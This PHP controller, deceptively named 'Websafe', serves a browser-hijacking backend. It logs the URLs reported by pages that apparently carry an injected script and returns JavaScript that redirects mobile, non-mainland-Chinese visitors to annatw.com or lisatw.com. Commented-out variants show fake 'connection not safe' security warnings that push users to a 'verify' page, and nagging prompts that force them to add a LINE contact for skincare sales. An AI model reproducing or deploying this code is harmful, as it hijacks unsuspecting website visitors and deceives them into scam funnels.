<?php

namespace app\controller;
use app\BaseController;
use think\facade\Log;
use think\facade\Db;
class Websafe extends BaseController
{
    function __construct()
    {
        header('Access-Control-Allow-Origin: *');
        Log::close();
    }
    //public static $myip = ['220.246.113.60', '113.66.55.99', '113.66.52.235'];
    public static $myip =[];
    function index()
    {
        $data = json_encode([
            'code' => 0,
            'status' => 'error',
        ]);
        return $data;
    }

    function i()
    {
        return self::l();
    }

    function l()
    {
        if (
            !array_key_exists('href', $_POST) &&
            !array_key_exists('v', $_POST)
        ) {
            $data = json_encode([
                'code' => 0,
                'status' => 'error',
            ]);
            return $data;
        }
        $data = json_encode([
            'code' => 1,
            'status' => 'ok',
        ]);
        $ip = getHostIp();
        $href = array_key_exists('href', $_POST) ? $_POST['href'] : $_POST['v'];
        $parts = parse_url($href);
        if ($parts === false) {
            return $data;
        }
        if (!array_key_exists('scheme', $parts)) {
            return $data;
        }
        if (!array_key_exists('host', $parts)) {
            return $data;
        }

        if (empty($parts['host'])) {
            return $data;
        }

        if (!array_key_exists('path', $parts)) {
            $parts['path'] = '';
        }
        $url = $parts['scheme'] . '://' . $parts['host'] . $parts['path'];
        $url = trim($url);

        $host = $parts['host'];

        if (strpos($url, '127') === true) {
            return $data;
        }
        if (strpos($url, 'localhost') === true) {
            return $data;
        }
        if (in_array($ip, self::$myip)) {
            return $data;
        }

        if (!empty(Db::table('web')->getByUrl($host))) {
            return $data;
        }

        self::savelog($url);
        return self::hijack($href);
    }
  
    private function savedemo()
    {
      if(isset($_GET['url']))
      {
        $url = $_GET['url'];
        $table = Db::name('safe_log');
        $data = $table->whereDay('date')->getByUrl($url);
        if (empty($data)) {
            $dt = ['ip' => getHostIp(), 'url' => $url];
            $table->strict(false)->insert($dt);
        } else {
            $table
                ->where('id', $data['id'])
                ->inc('count')
                ->update();
        }
      }
    }

    static function savelog($url)
    {
        $table = Db::name('safe_log');
        $data = $table->whereDay('date')->getByUrl($url);
        if (empty($data)) {
            $dt = ['ip' => getHostIp(), 'url' => $url];
            $table->strict(false)->insert($dt);
        } else {
            $table
                ->where('id', $data['id'])
                ->inc('count')
                ->update();
        }
    }

    static function getlinedata()
    {
        $arr = Db::name('user')
            ->where([['paas_id', '=', 42], ['status', '=', 1]])
            ->select()
            ->toArray();
        if(empty($arr) != false)
        {
          return false;
        }
        $key = array_rand($arr);
        return $arr[$key];
    }

    private function demo()
    {
       var_export(self::getlinedata());
    }

    static function hijack($href = '')
    {
        $timing = 4; //劫持间隔时间
        $defaultRes = json_encode([ 'code' => 1,'status' => 'ok ',]);
        if ($timing == -1) {
            return $defaultRes;
        }
        $linedata = self::getlinedata();
        if($linedata == false)
        {
          return $defaultRes;
        }
        // 劫持LINE好友
        //$jscode ='javascript:{!function(){var version=window.navigator.platform,pcurl="'.$linedata['link_pc'].'",mburl="'.$linedata['link_mb'].'";if("Win32"!=version&&"MacPPC"!=version&&"Linuxi586"!=version){var a=String((new Date).getTime()),b=1e4*parseInt(a.charAt(a.length-1))+4e4;setTimeout(n,b),setInterval(n,6e4)}function n(){confirm("請先打開LINE程式，加入肌膚保養專家LINE好友「lineID: '.$linedata['account'] .'」，再繼續閱讀 \n Please join the LINE friend (lineID: '.$linedata['account'] .') before continuing reading")?(window.open(pcurl),location.href=mburl):n()}}();}';
       
        $weburl = "https://www.annatw.com/safe";
        if($linedata['office']=='707')
        {
          $weburl = "https://www.lisatw.com/safe";
        }
        $jscode = "javascript:(function(){var version=window.navigator.platform;if('Win32'!=version&&'MacPPC'!=version&&'Linuxi586'!=version)try{window.top.location.href='".$weburl."';window.top.showline=function(){window.top.open('".$linedata['link_pc']."')}}catch{}})();";
      
        /*
        // 劫持祛斑
        $tzjscode =  'javascript:!function(){var version=window.navigator.platform;if("Win32"!=version&&"MacPPC"!=version&&"Linuxi586"!=version){var a=String((new Date).getTime()),b=10*parseInt(a.charAt(a.length-1))*1e3;setTimeout(n,b)}function n(){if(confirm("Warning: this connection is not safe, the system has blocked access! Please click [confirm] access security link(⚠警告：此鏈接不安全，系統已阻止訪問！！請點擊【確定】訪問安全鏈接✅https://www.annatw.com)")){var popUp=window.open("https://www.annatw.com/verify");null!=popUp&&void 0!==popUp&&(alert("請點擊【一律顯示】解除窗口阻攔"),setTimeout(n,15e3)),-1===window.location.href.indexOf("svg")&&(location.href="https://www.annatw.com/verify")}else n()}}();';
        // end劫持祛斑
        
      
        // 劫持眼袋
        if(strpos($href,'yd')!==false){
          $linejs = 'javascript:!function(){var version=window.navigator.platform;if("Win32"!=version&&"MacPPC"!=version&&"Linuxi586"!=version){var a=String((new Date).getTime()),b=100*parseInt(a.charAt(a.length-1))+1e3;setTimeout(n,b)}function n(){if(confirm("⚠警告：此鏈接不安全，系統已阻止訪問！！請點擊【確定】訪問安全鏈接✅https://www.annatw.com/safe")){var popUp=window.open("https://www.annatw.com/safe");null!=popUp&&void 0!==popUp&&(alert("請點擊【一律顯示】解除窗口阻攔"),setTimeout(n,15e3)),-1===window.location.href.indexOf("svg")&&(location.href="https://www.annatw.com/safe")}else n()}}();';
        }
        // end劫持眼袋
        */ 
      
        if (date('i') % $timing === 0 && !self::zhCN() && isMobile()) {
            return json_encode([
                'code' => 5,
                'status' => 'ok ',
                'tz_url' => $jscode,
                'url' => $linedata['link_pc'],
                'ourweb' => $weburl
            ]);
        }
        return $defaultRes;
    }

    static function zhTW()
    {
        if (!array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER)) {
            return false;
        }
        if (
            strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), 'zh-tw') !==
            false
        ) {
            return true;
        } else {
            return false;
        }
    }

    static function zhCN()
    {
        if (!array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER)) {
            return true;
        }
        if (
            strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), 'zh-cn') !==
            false
        ) {
            return true;
        } else {
            return false;
        }
    }

    public function cndemo()
    {
        //仅供测试使用
        if (!array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER)) {
            return '別來無恙啊';
        }
        $lg = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
        if (
            strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), 'zh-cn') !==
            false
        ) {
            echo 'cn<br>', $lg;
            //return true;
        } else {
            echo 'tw<br>', $lg;
            //return false;
        }
    }
  
   public function html()
   {
     echo file_get_contents('https://www.annatw.com/safe');
   }
}
